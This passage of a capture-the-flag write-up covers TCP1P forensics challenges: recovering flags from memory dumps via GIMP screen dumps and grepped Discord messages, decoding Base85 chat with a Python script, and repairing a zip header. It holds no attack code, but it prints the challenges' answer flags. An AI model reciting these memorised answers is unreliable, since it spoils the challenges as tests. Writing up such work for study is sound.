Finally lets decrypt it

![image](https://hackmd.io/_uploads/Sy4u_hckyg.png)

![image](https://hackmd.io/_uploads/Hy8T_hc11g.png)

**Flag: TCP1P{thank_g0ddd_youre_able_to_decrypt_my_files}**

---

### LostProgress

![LostProgress](https://hackmd.io/_uploads/Ske-K29Jkg.png)

We got a dumped file and the challenge said something about the image and text file, I will check the process first

![image](https://hackmd.io/_uploads/ryMkchcJkx.png)

![image](https://hackmd.io/_uploads/BklZ9hcyJe.png)

These 2 seem to be holding 2 part of the flag, I will start with the image first, I will dump the screen of gimp process, after a while searching I found the firstpart (next to Suisei)

![image](https://hackmd.io/_uploads/rkhSqn5y1l.png)

Luckily I didn't stop after finding out the first part, I keep searching and found the second part (unintended :>, the actual way of getting the second part is you have to use mftparser then grep for the keyword "password", you can't string it because, it a template notepad)

![image](https://hackmd.io/_uploads/Hk9pq2qy1e.png)

**Flag: CP1P{wIeRRRMQqykX6zs3O7KSQY6Xq6z4TKnr_ekxyAH2jIrh0Opyu432tk9y0KdiujkMu}**

---

### SecreTalk

![SecureTalk](https://hackmd.io/_uploads/SJneih5yJg.png)

We also got a dumped file this time, so I will do the same thing as above, first check it process to identify the culprit

![image](https://hackmd.io/_uploads/SktUs25Jyg.png)

So it was Discord, I was going to dump the screen again but we are running low on time (I join the CTF at the mark of 4 hours left) so I decided to take a leap of faith, I guessed, if it run when the ram got captured it will store the message inside, I tried grepping for some of Discord's unique keyword like "mention" and the author name =))) "C2uru" and I was right, it really there.

![image](https://hackmd.io/_uploads/HkgW3h9ykl.png)

![image](https://hackmd.io/_uploads/HJ_bhhqkJe.png)

![image](https://hackmd.io/_uploads/B1Zfn351kl.png)

![image](https://hackmd.io/_uploads/Bk5f329k1l.png)

this is the whole conversation anyway

```!
hello, it's me, code name 0x69m
Mokay, 0x69. How do we communicate on discord now? Do we need to obfuscate it?m
fLet's put it this way, we use base encoding in python library and convert the bytes to long data type.m
well, let's do it nowm
QF)=qaFgZCeGdMXkFg7_iF*!6aGBG(eGBY<fH#RUdGB7zgGBr6kHaIjjH#RdhGdDCaFf}tcGdDFfI5sxm
>F*!LjG&eOiG%__cGcY(cHa9XiGcq|dH#IjnGBGhUH#0UhG%+zUGc-6gGcom
>F*!LjG&eOiG%__cGcY(cHa9XiGcq|dH#IjnGBGhUH#0UhG%+zUGc-6gGcom
LGBq|aGBP$dGdDLkFgG<bI50LdH8wCcHZ?FbG&V3dH#j&lG&MLgF*h?dI5#*jI5agfIW#voGBEm
F*Z3iGdMXiI5jsgF*G<bF)=eSG&eChGB+?cHZnOdF*7$fHa0OfH#0akI5smdG%+<aH90UbGd46iIXN~qHZU|ZH#0IZHZnIfG&VIhHZeFhGBPtcH#s#pFf=tXG&VQm
0IW{sgF)=kaI5;>lH#9OhH8(gmFf=kWH#9ObFgY?aI50RhH!um
VGcq<eF)}teGBP(fGc`6hGch<hIWjOfGB+_XI5;sgH!w0bFflPWGB7zbGBY_iH#IUfGch+ZGdVaoF*7hUH2m
iF)=YTGc`0aGcYhWHaRphF*GqaI5RLeH#RpoGc-9eHZwLgGC4LlFfleYGB!9fF*i6jH8wFfF*7wYH8e9aIW{yfG&VOiFf=$YF*G?dG&wUeH8C+aIXE;lF*7nXHaIajFgP_gF*Z3hF*G$aGBY$dF*YzZHa9plH!(0aF*P$XI5sylFgP(aG%+|bGch+gI5;ykG&L|aHaRjdGBPnWIW#mhHZw3bFfueXH#s&oF*G?eI5{>jH#jpeIW;shI50IhF)}hVG&wUjGchqaFfundH#s>pH#0anGc_?VH8wIcHZnLlIWRaiFgP|eH8V0dIW{vnGdMLdHZwUlGc!3hHZ?RgH8V6bIXE`m
GchwVIWRCeH8?aiGcq+bI5;sfGcq_bGd3|ZG&4CdF*Z3iH8L?WIWRRbG&eCYH8wLbH8?RbHZnLdH90gjH8(RbH8eOeF)=qWH8?mkFg7wWG&naiGd4FcIW;mhIWaOeIWjUcIW#gcHaIyjGch+fG&VOjIWsgcIRm
G%+(XGd4LjHZ(FcH90dmHaRpoFfubaH83$ZGBhwSH90mkG&V3dGB`LkHZm|bI5;;pFflYWGBz_bGBY<aGdDLmG&D0ZGchnUG%`6cGcz_gH8L<cHa0LfF)}tYH8L|WI5RacH#9ajI5IagGBGzeG&MIlHZ?alH!?6WGdD0XF)=wfH#RpkGcz(VFfcVUH!(FZIWsdbH83+dFg7wbF)%VXFfcMQG&nObH8C(VH8(LhF*G+eGBYzYGBG(cF)=bXG%zzZH8M5m
IW#ggIXE>lH#ssjGC4RfHZV3aH!?6dGcz_dH!wCZI59afF*z|aGBGqVFgY?gF)%SWFfcVSFf%wfHaRddHa9jgIXF2oF*GnYG&eUiI50CdFf%bYG&C|YH#RpnH90mlGB!6gF)%ncIWjdcG&ndkG&C?YI5RmlFgY|iF*G?dH#RmhH#9ghH#RUgFf}zYGch+cI5svkF*r3dF)}qbF)}tYH#aadFgY+VI59IaG%+(XIXE>nFgP|gIWspmHZeFcF)%eVH90XhHvm
iF)=YTGc`0aGcYhWHaRphF*GqaI5RLeH#RpoGc-9eHZwLgGC4LlFfleYGB!9fF*i6jH8wFfF*7wYH8e9aIW{yfG&VOiFf=$YF*G?dG&wUeH8C+aIXE;lF*7nXHaIajFgP_gF*Z3hF*G$aGBY$dF*YzZHa9plH!(0aF*P$XI5sylFgP(aG%+|bGch+gI5;ykG&L|aHaRjdGBPnWIW#mhHZw3bFfueXH#s&oF*G?eI5{>jH#jpeIW;shI50IhF)}hVG&wUjGchqaFfundH#s>pH#0anGc_?VH8wIcHZnLlIWRaiFgP|eH8V0dIW{vnGdMLdHZwUlGc!3hHZ?RgH8V6bIXE`m
VGcq<eF)}teGBP(fGc`6hGch<hIWjOfGB+_XI5;sgH!w0bFflPWGB7zbGBY_iH#IUfGch+ZGdVaoF*7hUH2m
```
make sure to get rid of the "m" at the end of each string and some may have "f" at the beginning. So they said something about ` we use base encoding in python library and convert the bytes to long data type` It guessing time (or you can use Cyberchef)

![image](https://hackmd.io/_uploads/B1Rtn3cyJx.png)

I see it positive to Base85, so I use this script to decode it back

```py!
from Crypto.Util.number import long_to_bytes
import base64

def Debase85(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip() 
            try:
                decoded_data = base64.b85decode(line)
                byte_data = long_to_bytes(int(decoded_data))

                print(f"Original: {line}")
                print(f"Value: {byte_data}")
                print()
            except Exception as e:
                print(f"Failed to decode line")

Debase85('chat.txt')
```
![image](https://hackmd.io/_uploads/rkuTn39J1l.png)

There a google drive link, it lead to a unknow file

![image](https://hackmd.io/_uploads/rylylT2c1Je.png)

![image](https://hackmd.io/_uploads/H17Za25J1g.png)

This part where I failed, I don't know how to fix it back, after the CTFs end I read ["warlocksmurf"](https://warlocksmurf.github.io/posts/tcp1pctf2024/#secretalk-forensics-) Write-up about it, and got some hint how to do it, after researching I found this [write-up](https://github.com/bl4de/ctf/blob/master/2017/PlaidCTF_2017/zipper/zipper.md) following the write-up I managed to put back the Filename length but still wrong at some point I don't know why

![image](https://hackmd.io/_uploads/S1NzAn9Jke.png)

After trying for hours, I finally reach-out to WarLockSmurf and we had a conversation.

![image](https://hackmd.io/_uploads/BkMLCh51kg.png)

![image](https://hackmd.io/_uploads/SJGvC2c11e.png)

Anyway, here the zip file after fixing it.

![image](https://hackmd.io/_uploads/BJd1yp51yx.png)

![image](https://hackmd.io/_uploads/H1lF1a9JJe.png)

and got the Flag, big thanks to [WarlockSmurt](https://warlocksmurf.github.io/$whoami/).

![image](https://hackmd.io/_uploads/rk9RJa9Jke.png)

**Flag: TCP1P{w0w_y0u_m4n4ged_t0_get_this_d0cument.I_4s_the_fi4ncé_0f_mizuh4r4_chizuru_4ppreci4te_y0ur_eff0rts_GGWP}**

---
Thanks for reading y'all, from BlitzHack with love, happyhacking

![image](https://hackmd.io/_uploads/H1gdBlTqkke.png)
